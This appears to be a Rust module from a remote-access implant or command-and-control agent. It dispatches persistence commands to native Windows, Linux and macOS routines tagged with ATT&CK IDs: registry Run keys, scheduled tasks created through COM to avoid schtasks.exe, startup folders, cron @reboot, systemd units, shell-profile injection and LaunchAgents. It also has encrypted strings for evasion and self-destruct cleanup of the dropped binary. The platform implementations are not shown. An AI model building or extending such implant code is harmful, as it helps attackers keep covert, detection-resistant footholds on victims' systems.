// src/agent/persistence/mod.rs
//
// Persistence module. First-class persist:* commands backed by native
// implementations - no exec_os wrappers, no Rhai scripts, no child-process
// spawning (exception: crontab on Linux, which has no kernel-direct path
// for non-root users).
//
// ATT&CK coverage:
//   T1547.001 Registry Run Key (Windows - HKCU and HKLM)
//   T1053.005 Scheduled Task (Windows - COM ITaskService, no schtasks.exe)
//   T1547.009 Startup Folder (Windows)
//   T1053.003 Cron (Linux / macOS)
//   T1543.002 Systemd User Service (Linux)
//   T1546.004 Shell Profile Injection (Linux - .bashrc / .profile)
//   T1543.001 LaunchAgent (macOS)

use crate::strcrypt_rt;
use strcrypt::aes_str;
#[cfg(target_os = "windows")]
pub mod windows;

#[cfg(target_os = "linux")]
pub mod linux;

#[cfg(target_os = "macos")]
pub mod macos;

// ── Windows ───────────────────────────────────────────────────────────

/// T1547.001 - HKCU\...\Run (no admin required)
pub fn install_run(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_run(name, path, false);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err(aes_str!("Windows only")) }
}

/// T1547.001 - HKLM\...\Run (admin required)
pub fn install_run_hklm(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_run(name, path, true);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err(aes_str!("Windows only")) }
}

pub fn remove_run(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_run(name, false);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err(aes_str!("Windows only")) }
}

pub fn remove_run_hklm(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_run(name, true);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err(aes_str!("Windows only")) }
}

/// T1053.005 - Scheduled task via COM ITaskService (logon trigger, least privilege)
pub fn install_task(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_task(name, path);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err(aes_str!("Windows only")) }
}

pub fn remove_task(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_task(name);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err(aes_str!("Windows only")) }
}

/// T1547.009 - User startup folder
pub fn install_startup(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::install_startup(name, path);
    #[cfg(not(target_os = "windows"))]
    { let _ = (name, path); Err(aes_str!("Windows only")) }
}

pub fn remove_startup(name: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    return windows::remove_startup(name);
    #[cfg(not(target_os = "windows"))]
    { let _ = name; Err(aes_str!("Windows only")) }
}

// ── Linux ─────────────────────────────────────────────────────────────

/// T1053.003 - @reboot crontab (Linux)
pub fn install_cron_linux(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_cron(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err(aes_str!("Linux only")) }
}

pub fn remove_cron_linux(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_cron(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err(aes_str!("Linux only")) }
}

/// T1543.002 - Systemd user service
pub fn install_systemd(name: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_systemd(name, path);
    #[cfg(not(target_os = "linux"))]
    { let _ = (name, path); Err(aes_str!("Linux only")) }
}
#[cfg(target_os = "linux")]
pub fn install_user_unit(name: &str, path: &str) -> Result<String, String> {
    return linux::install_user_unit(name, path);
}

#[cfg(target_os = "linux")]
pub fn install_system_unit(name: &str, path: &str) -> Result<String, String> {
    return linux::install_system_unit(name, path);
}


pub fn remove_systemd(name: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_systemd(name);
    #[cfg(not(target_os = "linux"))]
    { let _ = name; Err(aes_str!("Linux only")) }
}

/// T1546.004 - Shell profile injection (~/.bashrc and ~/.profile)
pub fn install_profile(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::install_profile(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err(aes_str!("Linux only")) }
}

pub fn remove_profile(path: &str) -> Result<String, String> {
    #[cfg(target_os = "linux")]
    return linux::remove_profile(path);
    #[cfg(not(target_os = "linux"))]
    { let _ = path; Err(aes_str!("Linux only")) }
}

// ── macOS ─────────────────────────────────────────────────────────────

/// T1543.001 - LaunchAgent plist (~user/Library/LaunchAgents)
pub fn install_launchagent(label: &str, path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::install_launchagent(label, path);
    #[cfg(not(target_os = "macos"))]
    { let _ = (label, path); Err(aes_str!("macOS only")) }
}

pub fn remove_launchagent(label: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::remove_launchagent(label);
    #[cfg(not(target_os = "macos"))]
    { let _ = label; Err(aes_str!("macOS only")) }
}

/// T1053.003 - @reboot crontab (macOS)
pub fn install_cron_macos(path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::install_cron(path);
    #[cfg(not(target_os = "macos"))]
    { let _ = path; Err(aes_str!("macOS only")) }
}

pub fn remove_cron_macos(path: &str) -> Result<String, String> {
    #[cfg(target_os = "macos")]
    return macos::remove_cron(path);
    #[cfg(not(target_os = "macos"))]
    { let _ = path; Err(aes_str!("macOS only")) }
}

// ── Full cleanup ──────────────────────────────────────────────────────

/// Compute the stable-drop path of the currently running binary using the
/// same layout as the platform's stable_drop() (without copying anything).
/// Used by self-destruct so the persistent copy is deleted together with
/// the running image.
pub fn current_stable_path() -> Option<String> {
    #[cfg(target_os = "windows")]
    return windows::stable_path_for_current_exe();
    #[cfg(target_os = "linux")]
    return linux::stable_path_for_current_exe();
    #[cfg(target_os = "macos")]
    return macos::stable_path_for_current_exe();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    None
}

/// Remove ALL persistence artifacts this install created on the current
/// platform, keyed by the stable-drop location rather than operator-chosen
/// label names. Returns a structured per-method report
/// (`<method>: removed|failed|not-present`). Never fails hard - individual
/// failures are reported inline so one stubborn artifact cannot abort the
/// rest of the cleanup.
pub fn cleanup_all() -> String {
    #[cfg(target_os = "windows")]
    return windows::cleanup_all();
    #[cfg(target_os = "linux")]
    return linux::cleanup_all();
    #[cfg(target_os = "macos")]
    return macos::cleanup_all();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    aes_str!("Persistence cleanup: unsupported platform")
}

// ── Inventory ─────────────────────────────────────────────────────────

/// Return a human-readable inventory of installed persistence mechanisms.
pub fn list() -> String {
    #[cfg(target_os = "windows")]
    return windows::list();
    #[cfg(target_os = "linux")]
    return linux::list();
    #[cfg(target_os = "macos")]
    return macos::list();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    aes_str!("Unsupported platform")
}